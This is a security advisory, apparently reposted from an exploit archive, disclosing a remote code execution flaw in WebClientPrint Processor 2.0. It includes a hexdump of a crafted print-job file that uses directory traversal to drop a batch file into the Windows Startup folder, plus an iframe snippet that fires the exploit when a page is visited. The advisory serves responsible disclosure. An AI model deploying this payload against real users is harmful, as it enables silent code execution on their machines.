@@ -1,0 +1,242 @@
+id: 28362
+date: 08/23/2017
+title: WebClientPrint Processor 2.0.15.190 Print Jobs Remote Code Execution Vulnerability
+author: RedTeam
+cves: 
+
+Advisory: WebClientPrint Processor 2.0: Remote Code Execution via Print Jobs
+
+RedTeam Pentesting discovered that malicious print jobs can be used to
+trigger a remote code execution vulnerability in WebClientPrint
+Processor (WCPP). These print jobs may be distributed via specially
+crafted websites and are processed without any user interaction as soon
+as the website is accessed.
+
+Details
+=======
+
+Product: Neodynamic WebClientPrint Processor
+Affected Versions: 2.0.15.109 (Microsoft Windows)
+Fixed Versions: >= 2.0.15.910
+Vulnerability Type: Remote Code Execution
+Security Risk: high
+Vendor URL: http://www.neodynamic.com/
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2015-008
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+Neodynamic's WebClientPrint Processor is a client-side application which
+allows server-side applications to print documents on a client's printer
+without user interaction, bypassing the browser's print functionality.
+The server-side application may be written in ASP.NET or PHP while on
+the client-side multiple platforms and browsers are supported.
+
+"Send raw data, text and native commands to client printers without
+showing or displaying any print dialog box!" (Neodynamic's website)
+
+
+More Details
+============
+
+Upon installation under Microsoft Windows, WCPP registers itself as a
+handler for the "webclientprint" URL scheme. Thus, any URL starting with
+"webclientprint:" is handled by WCPP. For example, entering
+
+webclientprint:-about
+
+in the URL bar of a browser opens the about box of WCPP.
+
+In order to automatically print a text file using WCPP, a URL such as
+the following is requested (e.g. via JavaScript code or an iframe HTML
+tag in a website):
+
+webclientprint:https://example.com/somedir/lorem.txt
+
+The file lorem.txt conforms to Neodynamic's proprietary file format CPJ
+and contains the following data:
+
+-----------------------------------------------------------------------
+$ xxd lorem.txt
+00000000: 6370 6a02 fc0b 0000 070c 0000 7763 7050  cpj.........wcpP
+00000010: 463a 6632 3330 6262 3766 3965 3338 3437  F:f230bb7f9e3847
+00000020: 3633 6132 3765 6663 3565 6237 6633 6436  63a27efc5eb7f3d6
+00000030: 6661 2e54 5854 7c50 7269 6e74 6564 2042  fa.TXT|Printed B
+00000040: 7920 5765 6243 6c69 656e 7450 7269 6e74  y WebClientPrint
+00000050: 0d0a 3d3d 3d3d 3d3d 3d3d 3d3d 3d3d 3d3d  ..==============
+00000060: 3d3d 3d3d 3d3d 3d3d 3d3d 3d0d 0a0d 0a4c  ===========....L
+00000070: 6f72 656d 2069 7073 756d 2064 6f6c 6f72  orem ipsum dolor
+00000080: 2073 6974 2061 6d65 742c 2063 6f6e 7365   sit amet, conse
+00000090: 6374 6574 7572 2061 6469 7069 7363 696e  ctetur adipiscin
+000000a0: 6720 656c 6974 2e20 4675 7363 6520 7572  g elit. Fusce ur
+[...]
+00000bc0: 6275 6c75 6d20 7675 6c70 7574 6174 6520  bulum vulputate
+00000bd0: 6d61 676e 6120 6772 6176 6964 6120 6e65  magna gravida ne
+00000be0: 7175 6520 696d 7065 7264 6965 7420 6163  que imperdiet ac
+00000bf0: 2076 6976 6572 7261 206e 756c 6c61 2073   viverra nulla s
+00000c00: 7573 6369 7069 742e 0150 4446 4372 6561  uscipit..PDFCrea
+00000c10: 746f 7241 636f 7069 616e 2054 6563 686e  torAcopian Techn
+00000c20: 6963 616c 2043 6f6d 7061 6e79 202d 2031  ical Company - 1
+00000c30: 2057 6562 4170 7020 4c69 6320 2d20 3220   WebApp Lic - 2
+00000c40: 5765 6253 6572 7665 7220 4c69 637c xxxx  WebServer Lic|xx
+00000c50: xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx  xxxxxxxxxxxxxxxx
+00000c60: xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx  xxxxxxxxxxxxxxxx
+00000c70: xxxx xxxx xxxx                           xxxxxx
+-----------------------------------------------------------------------
+
+It was obtained from Neodynamic's online demo website[0]. Briefly, its
+structure can be described as follows:
+
+Offset   Size                                                     Usage
+-----------------------------------------------------------------------
+      0     3                                         magic bytes "cpj"
+      3     1                                                   unknown
+      4     4         offset "pc" (32 bit LE) for printer configuration
+      8     4                   offset "lk" (32 bit LE) for license key
+   0x0c     6                          filename/content header "wcpPF:"
+   0x12     -    filename and content separated by pipe ("|") character
+pc+0x12     -                                     printer configuration
+lk+0x12     -                                               license key
+
+In the example above, the file "f230bb7f9e384763a27efc5eb7f3d6fa.TXT"
+would be printed on the printer with the name "PDFCreator". The license
+key at the end of the file was intentionally redacted. Prior to
+printing, the text file with the dummy content is created in the current
+user's %TEMP% directory. Typically, this directory is located at:
+
+C:\Users\<user>\AppData\Local\Temp\
+
+
+Proof of Concept
+================
+
+During RedTeam Pentesting's analysis of WCPP it was found that malicious
+CPJ files can be crafted that exploit a directory traversal bug in WCPP.
+Such an example is given in the following hexdump, showing the file
+rce-user.txt:
+
+-----------------------------------------------------------------------
+$ xxd rce-user.txt
+00000000: 6370 6a02 0201 0000 0301 0000 7763 7050  cpj.........wcpP
+00000010: 463a 2e2e 5c2e 2e5c 526f 616d 696e 675c  F:..\..\Roaming\
+00000020: 4d69 6372 6f73 6f66 745c 5769 6e64 6f77  Microsoft\Window
+00000030: 735c 5374 6172 7420 4d65 6e75 5c50 726f  s\Start Menu\Pro
+00000040: 6772 616d 735c 5374 6172 7475 705c 5265  grams\Startup\Re
+00000050: 6454 6561 6d2e 6261 747c 4065 6368 6f20  dTeam.bat|@echo
+00000060: 6f66 660d 0a63 6c73 0d0a 6563 686f 2e0d  off..cls..echo..
+00000070: 0a65 6368 6f20 5072 6f6f 662d 6f66 2d43  .echo Proof-of-C
+00000080: 6f6e 6365 7074 0d0a 6563 686f 202d 2d2d  oncept..echo ---
+00000090: 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d0d 0a65  -------------..e
+000000a0: 6368 6f20 5265 6d6f 7465 2043 6f64 6520  cho Remote Code
+000000b0: 4578 6563 7574 696f 6e20 7669 6120 5765  Execution via We
+000000c0: 6243 6c69 656e 7450 7269 6e74 2076 322e  bClientPrint v2.
+000000d0: 302e 3135 2e31 3039 0d0a 464f 5220 2f4c  0.15.109..FOR /L
+000000e0: 2025 2578 2049 4e20 2831 2c31 2c31 3829   %%x IN (1,1,18)
+000000f0: 2044 4f20 6563 686f 2e0d 0a73 7461 7274   DO echo...start
+00000100: 2063 616c 630d 0a70 6175 7365 0d0a 007c   calc..pause...|
+-----------------------------------------------------------------------
+
+In this example the filename is set to
+
+..\..\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RedTeam.bat
+
+which is appended to the %TEMP% directory as follows:
+
+C:\Users\<user>\AppData\Local\Temp\..\..\Roaming\Microsoft\Windows\
+Start Menu\Programs\Startup\RedTeam.bat
+
+After resolving the "..\..\" sequence contained in the filename, this
+yields the following path:
+
+C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\
+Startup\RedTeam.bat
+
+As a consequence, the file content beginning at 0x5a is written to the
+file RedTeam.bat in the current user's Startup folder. Therefore,
+RedTeam.bat will be executed once the affected user logs in again. As a
+proof of concept, a text will be displayed and Windows' calculator is
+executed.
+
+On one hand, this exploit can be executed when the following URL is
+entered into the URL bar of a browser:
+
+webclientprint:https://example.com/somedir/rce-user.txt
+
+On the other hand, visiting users of a malicious website may be attacked
+without user interaction when the webclientprint URL is embedded into an
+iframe as follows:
+
+-----------------------------------------------------------------------
+<html>
+<body>
+<iframe src="webclientprint:https://example.com/somedir/rce-user.txt">
+</iframe>
+</body>
+</html>
+-----------------------------------------------------------------------
+
+The proof of concept printed above contains no valid license key, so a
+notification window is shown when the exploit is executed. However, this
+does not prevent successful exploitation. Attackers can easily add a
+valid license key (e.g. by buying a license), so the window is not shown
+and there is no visual indication of exploitation anymore.
+
+The proof of concept is designed to print using the default printer.
+Since WCPP does not seem to know how to print batch files, it exits
+silently with the result that a successful attack does not print the
+batch file.
+
+
+Workaround
+==========
+
+Affected users should disable the WCPP handler and upgrade to a fixed
+version as soon as possible.
+
+
+Fix
+===
+
+Install a WCPP version greater or equal to 2.0.15.910[1].
+
+
+Security Risk
+=============
+
+If a user of WCPP visits an attacker-controlled website, arbitrary code
+can be executed on the attacked user's computer. If a valid license key
+is provided, there is no visual indication of the ongoing attack.
+Furthermore, no user interaction is required to trigger the
+vulnerability once a malicious website is visited. It is therefore
+estimated that this vulnerability poses a high risk.
+
+
+Timeline
+========
+
+2015-08-24 Vulnerability identified
+2015-09-03 Customer approved disclosure to vendor
+2015-09-04 Asked vendor for security contact
+2015-09-04 CVE number requested
+2015-09-04 Vendor responded with security contact
+2015-09-07 Vendor notified
+2015-09-07 Vendor acknowledged receipt of advisory
+2015-09-15 Vendor released fixed version
+2015-09-16 Customer asked to wait with advisory release until all their
+           clients are updated
+2017-07-31 Customer approved advisory release
+2017-08-22 Advisory released
+
+
+References
+==========
+
+[0] http://webclientprint.azurewebsites.net/
+[1] https://neodynamic.wordpress.com/2015/09/15/webclientprint-2-0-for-windows-clients-critical-update/
+
+#  0day.today [2023-03-24]  #
